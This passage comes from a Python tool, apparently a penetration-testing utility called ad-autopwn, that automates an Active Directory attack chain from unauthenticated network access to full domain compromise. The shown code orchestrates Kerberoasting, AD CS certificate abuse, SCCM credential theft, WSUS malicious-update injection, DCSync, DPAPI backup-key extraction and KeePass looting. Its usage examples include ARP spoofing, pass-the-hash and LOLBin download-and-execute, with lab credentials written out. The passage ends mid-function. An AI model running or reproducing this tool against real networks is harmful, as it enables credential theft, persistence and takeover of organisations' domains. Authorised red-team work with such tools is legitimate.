    # Re-discover domain/DC now that we have creds
    if not cfg.domain:
        discovery = AutoDiscovery(cfg)
        discovery._detect_domain()
    if not cfg.dc_ip and cfg.domain:
        discovery = AutoDiscovery(cfg)
        discovery._detect_dc_ip()
    if not cfg.dc_fqdn and cfg.dc_ip:
        discovery = AutoDiscovery(cfg)
        discovery._detect_dc_fqdn()

    if not cfg.domain or not cfg.dc_ip or not cfg.dc_fqdn:
        log.error("Could not auto-detect domain/DC info after credential capture")
        log.warning(f"Re-run: {sys.argv[0]} -u '{cfg.username}' -p '{cfg.password}' -d DOMAIN --dc-ip IP")
        return

    # Step 4d: nxc enrichment battery (vuln checks + cred mining + recon)
    run_nxc_enrichment(cfg)

    # Step 4e: BloodHound graph collection + automatic analysis
    if not cfg.no_bloodhound:
        run_bloodhound_collect(cfg)

    # Step 5: Kerberoast + AS-REP Roast (immediate credential harvest)
    if not cfg.no_roast:
        log.info("Running Kerberoast + AS-REP Roast for additional credentials...")
        run_roast_attack(cfg)

    # Step 6: AD CS enum + exploitation (ESC1-ESC17 detect / ESC1-ESC16 exploit)
    if not cfg.no_adcs and tool_exists("certipy"):
        log.info("Enumerating AD CS for vulnerable certificate templates...")
        if run_adcs_attack(cfg):
            ok("AD CS exploitation succeeded — may have DA-equivalent credentials")

    # Step 7: SCCM NAA credential theft
    if not cfg.no_sccm:
        log.info("Attempting SCCM NAA credential theft...")
        run_sccm_attack(cfg)

    # Step 8: Enumerate + exploit
    relay_targets, _ = enumerate_targets(cfg)

    best_target = ""
    hv_file = cfg.work_dir / "high-value-targets.txt"
    if hv_file.exists():
        best_target = _first_line(hv_file.read_text())
    if best_target:
        ok(f"🎯 Auto-selected HIGH VALUE target: {best_target}")
    elif relay_targets:
        best_target = relay_targets[0]
        ok(f"Auto-selected target: {best_target}")

    if best_target:
        exploit_target(best_target, cfg)

    # Step 8a: Ghost-SPN upgrade (CVE-2025-58726) — opportunistic Kerberos
    # pivot when our relayed account has SPN-write rights on a target machine.
    if best_target and not cfg.no_ghost_spn:
        target_machine = best_target.split(".")[0] if "." in best_target else best_target
        try_ghost_spn_upgrade(target_machine, cfg)

    # Step 8b: WebDAV coercion — bypass SMB signing via HTTP relay
    if not best_target or not relay_targets:
        webclient_hosts = detect_webclient_hosts(cfg)
        for wh in webclient_hosts:
            if run_webdav_coercion(wh, cfg):
                break

    # Step 8c: DHCP coercion
    run_dhcp_coercion(cfg)

    # Step 8d: GPO abuse
    run_gpo_abuse(cfg)

    # Step 9: WSUS (authenticated phase)
    if not cfg.no_wsus and cfg.wsus_server:
        # Now that we have creds, try HTTPS relay with auto-cert if initial HTTP relay failed
        if cfg.wsus_https and not cfg.wsus_certfile and tool_exists("certipy"):
            log.info("Retrying WSUS HTTPS relay with certipy certificate abuse...")
            run_wsus_relay(cfg)
        # Inject malicious update (AppLocker bypass with signed delivery)
        log.info("Attempting WSUS update injection for persistence/AppLocker bypass...")
        run_wsus_inject(cfg)

    # Step 10: DCSync
    if not cfg.no_dcsync:
        dcsync_attack(best_target or cfg.dc_ip, cfg)

    # Step 10b: DPAPI backup key extraction (post-DCSync goldmine)
    if not cfg.no_dpapi:
        run_dpapi_backup(cfg)

    # Step 11: Loot — process cmdlines + KeePass on hosts we landed on
    if not cfg.no_loot:
        run_loot(cfg)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Summary
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def print_summary(cfg: Config):
    elapsed = int(time.time() - cfg.start_time)
    mins, secs = divmod(elapsed, 60)

    print(f"\n{C.BOLD_CYAN}╔══════════════════════════════════════════════════════╗")
    print(f"║           📊 ATTACK CHAIN SUMMARY                   ║")
    print(f"╠══════════════════════════════════════════════════════╣{C.NC}")

    rows = [
        ("🌐", "Domain:", cfg.domain or "N/A"),
        ("🖥️ ", "DC:", f"{cfg.dc_fqdn or 'N/A'} ({cfg.dc_ip or 'N/A'})"),
        ("🎯", "Attacker:", f"{cfg.attacker_ip} ({cfg.iface})"),
        ("📡", "Target net:", cfg.target_net or cfg.specific_target or "N/A"),
    ]
    if cfg.username:
        auth_type = "PTH" if cfg.nthash else ("cracked via ARP" if not cfg.password else "password")
        rows.append(("🔑", "Auth:", f"{cfg.domain}\\{cfg.username} ({auth_type})"))

    for emoji, label, value in rows:
        print(f"{C.CYAN}║{C.NC} {emoji} {label:<18} {C.WHITE}{value:<32}{C.NC} {C.CYAN}║{C.NC}")

    print(f"{C.CYAN}╠══════════════════════════════════════════════════════╣{C.NC}")

    # Stats
    stats = []
    for name, file_pat, color in [
        ("📍 Live hosts:", "live-hosts.txt", C.WHITE),
        ("🔓 Relay targets:", "relay-targets.txt", C.WHITE),
        ("🎣 NTLMv2 hashes:", "captured-ntlmv2.txt", C.WHITE),
    ]:
        f = cfg.work_dir / file_pat
        if f.exists():
            count = len([l for l in f.read_text().splitlines() if l.strip()])
            stats.append((name, f"{color}{count}{C.NC}"))

    # WPAD/WSUS results
    for label, pattern in [
        ("🌐 WPAD captures:", "wpad-relay.txt"),
        ("📦 WSUS captures:", "wsus-relay.txt"),
    ]:
        f = cfg.work_dir / pattern
        if f.exists():
            content = f.read_text()
            auth_count = len(re.findall(r"authenticated|SUCCEED", content, re.IGNORECASE))
            if auth_count:
                stats.append((label, f"{C.BOLD_GREEN}{auth_count} auth(s){C.NC}"))

    wsus_inj = cfg.work_dir / "wsus-inject.txt"
    if wsus_inj.exists() and "inject" in wsus_inj.read_text().lower():
        stats.append(("📦 WSUS inject:", f"{C.BOLD_YELLOW}update pushed{C.NC}"))

    pxe_creds = cfg.work_dir / "pxe-creds.txt"
    if pxe_creds.exists() and pxe_creds.stat().st_size > 0:
        cred_count = pxe_creds.read_text().count("[")
        stats.append(("🖥️  PXE creds:", f"{C.BOLD_GREEN}{cred_count} credential(s){C.NC}"))

    # AD CS results
    adcs_certs = list(cfg.work_dir.glob("adcs-*.pfx"))
    if adcs_certs:
        stats.append(("📜 AD CS certs:", f"{C.BOLD_GREEN}{len(adcs_certs)} certificate(s){C.NC}"))
    adcs_enum = cfg.work_dir / "adcs-enum.txt"
    if adcs_enum.exists():
        vuln_count = len(re.findall(r"ESC\d+", adcs_enum.read_text()))
        if vuln_count:
            stats.append(("🔓 AD CS vulns:", f"{C.BOLD_YELLOW}{vuln_count} ESC finding(s){C.NC}"))

    # Kerberoast / AS-REP results
    for label, pattern in [
        ("🔥 Kerberoast:", "kerberoast-cracked.txt"),
        ("🔥 AS-REP:", "asrep-cracked.txt"),
    ]:
        f = cfg.work_dir / pattern
        if f.exists() and f.stat().st_size > 0:
            count = len(f.read_text().strip().splitlines())
            stats.append((label, f"{C.BOLD_GREEN}{count} cracked{C.NC}"))
    roast_hashes = cfg.work_dir / "kerberoast-hashes.txt"
    if roast_hashes.exists():
        count = len(roast_hashes.read_text().strip().splitlines())
        if count:
            stats.append(("🎫 SPN hashes:", f"{C.WHITE}{count}{C.NC}"))

    # NTLM theft drops
    theft_drops = cfg.work_dir / "ntlm-theft-drops.txt"
    if theft_drops.exists():
        count = len(theft_drops.read_text().strip().splitlines())
        if count:
            stats.append(("📂 Theft drops:", f"{C.WHITE}{count} file(s) placed{C.NC}"))

    # SCCM NAA
    sccm_creds = cfg.work_dir / "sccm-naa.txt"
    if sccm_creds.exists() and sccm_creds.stat().st_size > 0:
        stats.append(("🏢 SCCM NAA:", f"{C.BOLD_GREEN}credentials extracted{C.NC}"))

    # Shadow Credentials
    shadow_pfx = list(cfg.work_dir.glob("shadow-*.pfx"))
    if shadow_pfx:
        stats.append(("👤 Shadow creds:", f"{C.BOLD_GREEN}{len(shadow_pfx)} cert(s){C.NC}"))

    # RBCD
    rbcd_tickets = list(cfg.work_dir.glob("rbcd-*.ccache"))
    if rbcd_tickets:
        stats.append(("🎟️  RBCD ticket:", f"{C.BOLD_GREEN}S4U2Proxy succeeded{C.NC}"))

    # DPAPI backup key
    dpapi_key = cfg.work_dir / "dpapi-backupkey.pvk"
    if dpapi_key.exists():
        stats.append(("🔐 DPAPI key:", f"{C.BOLD_YELLOW}backup key extracted{C.NC}"))

    # nxc enrichment extracted creds (LAPS / userPassword / desc / timeroast)
    enrich_creds = cfg.work_dir / "enrich-extracted-creds.txt"
    if enrich_creds.exists():
        n = len([l for l in enrich_creds.read_text().splitlines() if l.strip()])
        if n:
            stats.append(("📝 Enrich creds:", f"{C.BOLD_GREEN}{n} extracted{C.NC}"))
    enrich_summary = cfg.work_dir / "enrich-summary.txt"
    if enrich_summary.exists():
        flags = [l.strip() for l in enrich_summary.read_text().splitlines() if l.strip()]
        for flag in flags:
            U = flag.upper()
            if "VULNERABLE" in U or "PRIV-ESC" in U:
                stats.append(("🔥 Vuln finding:", f"{C.BOLD_RED}{flag[:32]}{C.NC}"))
            elif "BADSUCCESSOR" in U:
                stats.append(("🔥 BadSuccessor:", f"{C.BOLD_YELLOW}{flag[:32]}{C.NC}"))
            elif "MAQ-RBCD-VIABLE" in U:
                stats.append(("🎫 MAQ:", f"{C.BOLD_YELLOW}{flag.split(':',1)[1].strip()[:32]}{C.NC}"))
    enrich_timeroast_cracked = cfg.work_dir / "enrich-timeroast-cracked.txt"
    if enrich_timeroast_cracked.exists() and enrich_timeroast_cracked.stat().st_size > 0:
        n = len(enrich_timeroast_cracked.read_text().strip().splitlines())
        stats.append(("⏰ Timeroast:", f"{C.BOLD_GREEN}{n} cracked{C.NC}"))

    # BloodHound analysis
    bh_analysis = cfg.work_dir / "bloodhound-analysis.txt"
    if bh_analysis.exists():
        bh_text = bh_analysis.read_text()
        bh_findings = sum(1 for ln in bh_text.splitlines() if ln.startswith("  - "))
        if bh_findings:
            stats.append(("🐶 BloodHound:", f"{C.BOLD_GREEN}{bh_findings} findings{C.NC}"))
    bh_actionable = cfg.work_dir / "bloodhound-actionable.txt"
    if bh_actionable.exists():
        ae_count = len([l for l in bh_actionable.read_text().splitlines() if l.strip()])
        if ae_count:
            stats.append(("⚡ BH actionable:", f"{C.BOLD_YELLOW}{ae_count} edge(s){C.NC}"))

    # Loot results
    cmdline_secrets = sum(
        len(f.read_text().strip().splitlines())
        for f in cfg.work_dir.glob("loot-secrets-*.txt") if f.exists()
    )
    if cmdline_secrets:
        stats.append(("💰 Cmdline loot:", f"{C.BOLD_GREEN}{cmdline_secrets} secret(s){C.NC}"))
    kdbx_cracked = sum(
        1 for f in cfg.work_dir.glob("loot-*.kdbx.cracked")
        if f.exists() and f.stat().st_size > 0
    )
    if kdbx_cracked:
        stats.append(("💎 KeePass cracked:", f"{C.BOLD_GREEN}{kdbx_cracked} vault(s){C.NC}"))

    # WebDAV coercion
    webdav_relay = cfg.work_dir / "webdav-relay.txt"
    if webdav_relay.exists() and re.search(r"authenticated|SUCCEED",
                                            webdav_relay.read_text(), re.IGNORECASE):
        stats.append(("🌐 WebDAV:", f"{C.BOLD_GREEN}coercion succeeded{C.NC}"))

    # GPO abuse
    gpo_abuse = cfg.work_dir / "gpo-abuse.txt"
    if gpo_abuse.exists() and re.search(r"created|success", gpo_abuse.read_text(), re.IGNORECASE):
        stats.append(("📋 GPO abuse:", f"{C.BOLD_YELLOW}scheduled task created{C.NC}"))

    cracked = cfg.work_dir / "cracked.txt"
    if cracked.exists() and cracked.stat().st_size > 0:
        count = len(cracked.read_text().strip().splitlines())
        stats.append(("🔓 Cracked:", f"{C.BOLD_GREEN}{count} password(s){C.NC}"))

    comp_count = sum(
        len(f.read_text().strip().splitlines())
        for f in cfg.work_dir.glob("compromised*.txt") if f.exists()
    )
    if comp_count:
        stats.append(("💀 Compromised:", f"{C.BOLD_RED}{comp_count} host(s){C.NC}"))

    dump = cfg.work_dir / "secretsdump.txt"
    if dump.exists() and ":::" in dump.read_text():
        hash_count = dump.read_text().count(":::")
        stats.append(("🗝️  Hashes dumped:", f"{C.BOLD_GREEN}{hash_count} credentials{C.NC}"))
        if "krbtgt:" in dump.read_text():
            stats.append(("👑 Golden ticket:", f"{C.BOLD_YELLOW}krbtgt CAPTURED{C.NC}"))

    for label, value in stats:
        print(f"{C.CYAN}║{C.NC} {label:<20} {value:<42} {C.CYAN}║{C.NC}")

    print(f"{C.CYAN}╠══════════════════════════════════════════════════════╣{C.NC}")

    # Methods
    for wm in sorted(cfg.work_dir.glob("working-method-*.txt")):
        target = wm.stem.replace("working-method-", "")
        method = wm.read_text().strip()
        print(f"{C.CYAN}║{C.NC} ⚔️  {'Exploit:':<18} {C.WHITE}{method} → {target:<20}{C.NC} {C.CYAN}║{C.NC}")

    wc = cfg.work_dir / "working-coercion.txt"
    if wc.exists():
        print(f"{C.CYAN}║{C.NC} 🔨 {'DC coercion:':<18} {C.WHITE}{wc.read_text().strip():<32}{C.NC} {C.CYAN}║{C.NC}")

    print(f"{C.CYAN}╠══════════════════════════════════════════════════════╣{C.NC}")
    print(f"{C.CYAN}║{C.NC} ⏱️  {'Duration:':<18} {C.WHITE}{mins}m {secs}s{'':<25}{C.NC} {C.CYAN}║{C.NC}")
    print(f"{C.CYAN}║{C.NC} 📁 {'Output:':<18} {C.WHITE}{str(cfg.work_dir):<32}{C.NC} {C.CYAN}║{C.NC}")
    print(f"{C.CYAN}║{C.NC} 📋 {'Full log:':<18} {C.WHITE}{str(cfg.work_dir / 'chain.log'):<32}{C.NC} {C.CYAN}║{C.NC}")
    print(f"{C.BOLD_CYAN}╚══════════════════════════════════════════════════════╝{C.NC}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI & Main
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_args() -> Config:
    p = argparse.ArgumentParser(
        description="NTLM Relay Attack Chain: zero-auth to domain compromise — Triop AB",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          # FULLY AUTOMATED — no args needed
          sudo %(prog)s

          # With credentials
          %(prog)s -u jsmith -p 'P@ss123'

          # Pass-the-hash
          %(prog)s -u admin -H aad3b435b51404ee

          # ARP spoof only (zero-auth)
          %(prog)s --phase arp -t 10.0.0.0/24

          # Specific target + interface
          %(prog)s -u jsmith -p 'P@ss' -T 10.0.0.100 -i tun0

          # Dry run
          %(prog)s -u jsmith -p 'P@ss' --dry-run

          # WPAD poisoning (zero-auth)
          %(prog)s --phase wpad

          # WSUS relay + injection (AppLocker bypass)
          %(prog)s --phase wsus --wsus-server 10.0.0.50 --applocker

          # PXE boot credential theft (zero-auth)
          %(prog)s --phase pxe

          # Passive sniff only (recon)
          %(prog)s --phase sniff --sniff-duration 60

          # AppLocker bypass via LOLBin on specific target
          %(prog)s -u jsmith -p 'P@ss' -T 10.0.0.100 --applocker --lolbin mshta --custom-cmd "whoami"

          # Kerberos AP-REQ reflection via Unicode-SPN (Synacktiv 2026, bypasses CVE-2025-33073 patch)
          %(prog)s -u jsmith -p 'P@ss' -T srv01.corp.local --phase kerb-reflect

          # CVE-2026-24294 LPE — generates foothold script + relay listener
          %(prog)s --phase reflect-tcpport --reflect-host 10.0.0.50 --reflect-port 12345

          # CVE-2026-26128 LPE — Kerberos loopback via Unicode SPN
          %(prog)s -u jsmith -p 'P@ss' --phase reflect-loopback --reflect-host srv01.corp.local

          # Full chain with Unicode-SPN fallback when CVE-2025-33073 is patched
          %(prog)s -u jsmith -p 'P@ss' --unicode-spn

          # BloodHound collection + automatic high-value analysis
          %(prog)s -u sunfyre -p 'BSno5DP4tjJ4jIu8is3B' -d dracarys.lab \\
                   --dc-fqdn BALERION.dracarys.lab --dc-ip 192.168.56.10 --phase bloodhound

          # KCD protocol-transition bypass: rewrite TGS sname (tgssub-style)
          %(prog)s --phase tgs-rewrite \\
                   --in-ccache /tmp/admin@HTTP_arrax.dracarys.lab.ccache \\
                   --alt-spn HTTP/vhagar.dracarys.lab

          # Dollar Ticket — TGT for 'root' via auto-created root$ machine acct
          # (target a domain-joined Linux box for GSSAPI SSH login as root)
          %(prog)s -u sunfyre -p 'BSno5DP4tjJ4jIu8is3B' -d dracarys.lab \\
                   --phase dollar-ticket --target-user root

          # RBCD+KCD chain — full ghost-SPN + RBCD + altservice rewrite, in one shot
          # (need WriteSPN on the target machine — check BloodHound first)
          %(prog)s -u viserion -p '...' -d dracarys.lab \\
                   --phase rbcd-kcd -T VHAGAR$ --alt-spn HTTP/vhagar.dracarys.lab
        """),
    )

    creds = p.add_argument_group("Credentials (optional for zero-auth ARP mode)")
    creds.add_argument("-u", "--user", default="", help="Domain username")
    creds.add_argument("-p", "--password", default="", help="Domain password")
    creds.add_argument("-H", "--hash", default="", dest="nthash", help="NT hash (pass-the-hash)")

    net = p.add_argument_group("Network (auto-detected if omitted)")
    net.add_argument("-d", "--domain", default="", help="Target domain")
    net.add_argument("-a", "--attacker-ip", default="", help="Attacker IP")
    net.add_argument("-i", "--iface", default="", help="Network interface")
    net.add_argument("-t", "--target-net", default="", help="Target subnet CIDR")
    net.add_argument("-T", "--target", default="", dest="specific_target", help="Specific target IP")
    net.add_argument("--dc-ip", default="", help="Domain controller IP")
    net.add_argument("--dc-fqdn", default="", help="Domain controller FQDN")
    net.add_argument("--gateway", default="", help="Gateway IP for ARP spoof")

    attack = p.add_argument_group("Attack options")
    attack.add_argument("-m", "--method", default="", help="Coercion method")
    attack.add_argument("--custom-cmd", default="", help="Custom command on target")
    attack.add_argument("-s", "--socks", action="store_true", help="SOCKS proxy mode")
    attack.add_argument("--smb-signing", action="store_true", help="Bypass SMB signing (LDAPS)")
    attack.add_argument("--no-dcsync", action="store_true", help="Skip DC compromise")
    attack.add_argument("--no-cleanup", action="store_true", help="Keep DNS records")
    attack.add_argument("--no-arp", action="store_true", help="Disable ARP spoof fallback")
    attack.add_argument("--batch", action="store_true", help="Exploit all relay targets")
    attack.add_argument("--poison-duration", type=int, default=120, help="ARP spoof timeout (sec)")
    attack.add_argument("--exclude", default="", help="File with IPs to skip")

    wpad_wsus = p.add_argument_group("WPAD / WSUS attacks")
    wpad_wsus.add_argument("--wsus-server", default="", help="WSUS server IP (auto-detected if omitted)")
    wpad_wsus.add_argument("--wsus-port", type=int, default=0, help="WSUS port (default: 8530 HTTP, 8531 HTTPS)")
    wpad_wsus.add_argument("--wsus-https", action="store_true", help="WSUS uses HTTPS (port 8531)")
    wpad_wsus.add_argument("--wsus-certfile", default="", help="TLS cert for WSUS HTTPS interception")
    wpad_wsus.add_argument("--wsus-keyfile", default="", help="TLS key for WSUS HTTPS interception")
    wpad_wsus.add_argument("--no-wpad", action="store_true", help="Skip WPAD poisoning in full auto")
    wpad_wsus.add_argument("--no-wsus", action="store_true", help="Skip WSUS attacks in full auto")
    wpad_wsus.add_argument("--sniff-duration", type=int, default=30,
                           help="Passive sniff duration in seconds (default: 30)")

    applocker_grp = p.add_argument_group("AppLocker bypass")
    applocker_grp.add_argument("--applocker", action="store_true",
                               help="Enable AppLocker bypass: use LOLBins, trusted paths, WSUS signed delivery")
    applocker_grp.add_argument("--lolbin", default="", choices=list(LOLBINS.keys()),
                               help="Specific LOLBin to use (default: auto-select)")
    applocker_grp.add_argument("--payload-url", default="",
                               help="URL of payload for LOLBin download-and-execute")

    adv = p.add_argument_group("Advanced attacks")
    adv.add_argument("--no-adcs", action="store_true", help="Skip AD CS exploitation")
    adv.add_argument("--ca-name", default="", help="Certificate Authority name (auto-detected)")
    adv.add_argument("--esc-victim", default="",
                     help="ESC9/ESC10 UPN-swap victim as USER:PASS (account you have "
                          "WriteProperty on); enables CVE-2022-26923 bypass")
    adv.add_argument("--no-roast", action="store_true", help="Skip Kerberoasting / AS-REP Roasting")
    adv.add_argument("--no-ntlm-theft", action="store_true",
                     help="Skip NTLM theft file drops on writable shares")
    adv.add_argument("--no-sccm", action="store_true", help="Skip SCCM NAA credential theft")
    adv.add_argument("--sccm-server", default="", help="SCCM Management Point (auto-detected)")
    adv.add_argument("--no-shadow-creds", action="store_true",
                     help="Skip shadow credentials (use RBCD instead)")
    adv.add_argument("--no-rbcd", action="store_true", help="Skip RBCD delegation abuse")
    adv.add_argument("--machine-account", default="", help="Pre-created machine account for RBCD")
    adv.add_argument("--machine-password", default="", help="Machine account password for RBCD")
    adv.add_argument("--alt-spn", default="",
                     help="Alternate SPN (service/host) — passes -altservice to "
                          "impacket-getST and rewrites the issued TGS sname "
                          "(tgssub-style KCD protocol-transition bypass)")
    adv.add_argument("--in-ccache", default="",
                     help="Input ccache for --phase tgs-rewrite")
    adv.add_argument("--target-user", default="",
                     help="Target Linux user for --phase dollar-ticket "
                          "(e.g. 'root', 'sqladmin') — opt-in only, not in default chain")
    adv.add_argument("--no-dpapi", action="store_true",
                     help="Skip DPAPI backup key extraction after DCSync")
    adv.add_argument("--no-bloodhound", action="store_true",
                     help="Skip BloodHound -c All collection + automatic analysis")
    adv.add_argument("--no-bh-auto-action", action="store_true",
                     help="Disable opportunistic chains from BloodHound actionable edges "
                          "(WriteSPN→ghost-SPN, AddKeyCredentialLink→shadow-creds, "
                          "WriteAccountRestrictions→RBCD)")
    adv.add_argument("--no-loot", action="store_true",
                     help="Skip loot phase (process-cmdline harvest + KeePass discovery/crack)")

    disc = p.add_argument_group("Credential Discovery (zero-auth foothold)")
    disc.add_argument("--no-discover", action="store_true",
                      help="Skip pre-cut credential discovery phase")
    disc.add_argument("--users-file", default="",
                      help="Path to candidate username list (default: SecLists)")
    disc.add_argument("--spray-password", default="",
                      help="Single password to spray across discovered users (lockout-aware: one attempt per user)")

    refl = p.add_argument_group("Authentication-reflection bypass (Synacktiv 2026)")
    refl.add_argument("--unicode-spn", action="store_true",
                      help="Try Kerberos AP-REQ reflection via Unicode-SPN collision when NTLM methods fail")
    refl.add_argument("--no-ghost-spn", action="store_true",
                      help="Skip CVE-2025-58726 ghost-SPN upgrade after a successful relay")
    refl.add_argument("--no-loopback-check", action="store_true",
                      help="Skip Win11 24H2 / Server 2025 fingerprint during enum (LPE candidates)")
    refl.add_argument("--reflect-host", default="",
                      help="Foothold FQDN/IP for --phase reflect-tcpport / reflect-loopback")
    refl.add_argument("--reflect-port", type=int, default=12345,
                      help="High TCP port for SMB-on-tcpport (CVE-2026-24294, default: 12345)")

    run_opts = p.add_argument_group("Execution")
    run_opts.add_argument("--phase", default="full",
                          choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
                                   "pxe", "sniff", "adcs", "roast", "sccm", "enrich", "discover",
                                   "bloodhound", "tgs-rewrite", "loot",
                                   "dollar-ticket", "rbcd-kcd",
                                   "reflect-tcpport", "reflect-loopback", "kerb-reflect"],
                          help="Run a single phase")
    run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
    run_opts.add_argument("-v", "--verbose", action="store_true", help="Debug output")
    run_opts.add_argument("-o", "--output", default="", help="Output directory")

    args = p.parse_args()

    cfg = Config(
        username=args.user,
        password=args.password,
        nthash=args.nthash,
        domain=args.domain,
        attacker_ip=args.attacker_ip,
        iface=args.iface,
        gateway=args.gateway,
        target_net=args.target_net,
        specific_target=args.specific_target,
        dc_ip=args.dc_ip,
        dc_fqdn=args.dc_fqdn,
        method=args.method,
        custom_cmd=args.custom_cmd,
        use_socks=args.socks,
        smb_signing=args.smb_signing,
        no_dcsync=args.no_dcsync,
        no_cleanup=args.no_cleanup,
        no_arp=args.no_arp,
        batch=args.batch,
        poison_duration=args.poison_duration,
        wsus_server=args.wsus_server,
        wsus_port=args.wsus_port,
        wsus_https=args.wsus_https,
        wsus_certfile=args.wsus_certfile,
        wsus_keyfile=args.wsus_keyfile,
        no_wpad=args.no_wpad,
        no_wsus=args.no_wsus,
        sniff_duration=args.sniff_duration,
        applocker=args.applocker,
        lolbin=args.lolbin,
        payload_url=args.payload_url,
        no_adcs=args.no_adcs,
        ca_name=args.ca_name,
        esc_victim_user=(args.esc_victim.split(":", 1)[0] if args.esc_victim else ""),
        esc_victim_password=(args.esc_victim.split(":", 1)[1] if ":" in args.esc_victim else ""),
        no_roast=args.no_roast,
        no_ntlm_theft=args.no_ntlm_theft,
        no_sccm=args.no_sccm,
        sccm_server=args.sccm_server,
        no_shadow_creds=args.no_shadow_creds,
        no_rbcd=args.no_rbcd,
        machine_account=args.machine_account,
        machine_password=args.machine_password,
        alt_spn=args.alt_spn,
        in_ccache=args.in_ccache,
        target_user=args.target_user,
        no_dpapi=args.no_dpapi,
        no_bloodhound=args.no_bloodhound,
        no_bh_auto_action=args.no_bh_auto_action,
        no_loot=args.no_loot,
        no_discover=args.no_discover,
        users_file=args.users_file,
        spray_password=args.spray_password,
        unicode_spn=args.unicode_spn,
        no_ghost_spn=args.no_ghost_spn,
        no_loopback_check=args.no_loopback_check,
        reflect_host=args.reflect_host,
        reflect_port=args.reflect_port,
        phase=args.phase,
        dry_run=args.dry_run,
        verbose=args.verbose,
    )

    if args.output:
        cfg.work_dir = Path(args.output)
    else:
        cfg.work_dir = Path(f"./ad-autopwn-{datetime.now():%Y%m%d-%H%M%S}")

    return cfg


def main():
    cfg = parse_args()
    banner()

    if cfg.verbose:
        _console.setLevel(logging.DEBUG)

    if cfg.dry_run:
        log.warning("DRY RUN MODE — commands will be printed but not executed")
        print()

    # Check root for phases that need it
    if os.geteuid() != 0 and cfg.phase in ("full", "arp", "wpad", "wsus", "sniff") and not cfg.dry_run:
        log.error("Root required for network attacks (ARP spoof, packet capture, iptables)")
        log.error("Run with: sudo ad-autopwn " + " ".join(sys.argv[1:]))
        sys.exit(1)
    elif os.geteuid() != 0 and not cfg.dry_run:
        log.warning("Not running as root — network attacks (sniff, ARP, WPAD, WSUS) will be skipped")

    # Setup
    if not check_prerequisites(cfg):
        sys.exit(1)

    # Auto-discover network
    discovery = AutoDiscovery(cfg)
    discovery.run_all()

    # Create work directory + logging
    cfg.work_dir.mkdir(parents=True, exist_ok=True)
    setup_file_logging(cfg.work_dir)
    log.info(f"📁 Output directory: {cfg.work_dir}")

    # Save config
    config_file = cfg.work_dir / "config.txt"
    config_file.write_text(
        f"# ad-autopwn.py v{VERSION}\n"
        f"# Run: {datetime.now()}\n"
        f"# Command: {' '.join(sys.argv)}\n\n"
        f"Domain:     {cfg.domain}\n"
        f"User:       {cfg.username}\n"
        f"Auth:       {'NT hash' if cfg.nthash else 'password' if cfg.password else 'none (ARP)'}\n"
        f"Attacker:   {cfg.attacker_ip} ({cfg.iface})\n"
        f"Gateway:    {cfg.gateway}\n"
        f"DC IP:      {cfg.dc_ip}\n"
        f"DC FQDN:    {cfg.dc_fqdn}\n"
        f"Target net: {cfg.target_net or 'N/A'}\n"
        f"Target:     {cfg.specific_target or 'auto'}\n"
        f"Phase:      {cfg.phase}\n"
    )

    # Signal handler for cleanup
    def handle_signal(sig, frame):
        print(f"\n{C.YELLOW}⚠️  Interrupted — cleaning up...{C.NC}")
        cfg.cleanup()
        sys.exit(130)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    try:
        # ---- No creds? Full auto: ARP/WPAD/WSUS → crack → exploit → DCSync ----
        # ---- Passive sniff only ----
        if cfg.phase == "sniff":
            passive_sniff(cfg, duration=cfg.sniff_duration)
            print_summary(cfg)
            return

        # ---- No creds? Full auto: ARP/WPAD/WSUS → crack → exploit → DCSync ----
        if not cfg.has_creds and cfg.phase in ("full", "arp", "wpad", "wsus", "pxe"):
            if cfg.phase == "arp":
                run_arp_capture(cfg)
            elif cfg.phase == "wpad":
                run_wpad_attack(cfg)
                extract_hashes(cfg)
                try_crack_hashes(cfg)
            elif cfg.phase == "wsus":
                if run_wsus_relay(cfg):
                    extract_hashes(cfg)
                    try_crack_hashes(cfg)
                if cfg.wsus_server or detect_wsus_server(cfg):
                    run_wsus_inject(cfg)
            elif cfg.phase == "pxe":
                run_pxe_attack(cfg)
            else:
                run_full_auto(cfg)
            cleanup_dns_records(cfg)
            print_summary(cfg)
            return

        # ---- Authenticated attack phases ----
        match cfg.phase:
            case "enum":
                enumerate_targets(cfg)

            case "exploit":
                if cfg.specific_target:
                    exploit_target(cfg.specific_target, cfg)
                else:
                    relay_targets, _ = enumerate_targets(cfg)
                    if cfg.batch:
                        run_batch(relay_targets, cfg)
                    elif relay_targets:
                        ok(f"Auto-selected target: {relay_targets[0]}")
                        exploit_target(relay_targets[0], cfg)

            case "dcsync":
                if not cfg.specific_target:
                    log.error("--phase dcsync requires --target")
                    sys.exit(1)
                dcsync_attack(cfg.specific_target, cfg)

            case "arp":
                run_arp_capture(cfg)

            case "wpad":
                run_wpad_attack(cfg)
                extract_hashes(cfg)
                try_crack_hashes(cfg)

            case "wsus":
                if run_wsus_relay(cfg):
                    extract_hashes(cfg)
                    try_crack_hashes(cfg)
                if cfg.wsus_server or detect_wsus_server(cfg):
                    run_wsus_inject(cfg)

            case "pxe":
                run_pxe_attack(cfg)

            case "adcs":
                if not cfg.has_creds:
                    log.error("--phase adcs requires credentials (-u/-p)")
                    sys.exit(1)
                run_adcs_attack(cfg)

            case "roast":
                if not cfg.has_creds:
                    log.error("--phase roast requires credentials (-u/-p)")
                    sys.exit(1)
                run_roast_attack(cfg)

            case "sccm":
                if not cfg.has_creds:
                    log.error("--phase sccm requires credentials (-u/-p)")
                    sys.exit(1)
                run_sccm_attack(cfg)

            case "enrich":
                if not cfg.has_creds:
                    log.error("--phase enrich requires credentials (-u/-p)")
                    sys.exit(1)
                run_nxc_enrichment(cfg)

            case "bloodhound":
                if not cfg.has_creds:
                    log.error("--phase bloodhound requires credentials (-u/-p)")
                    sys.exit(1)
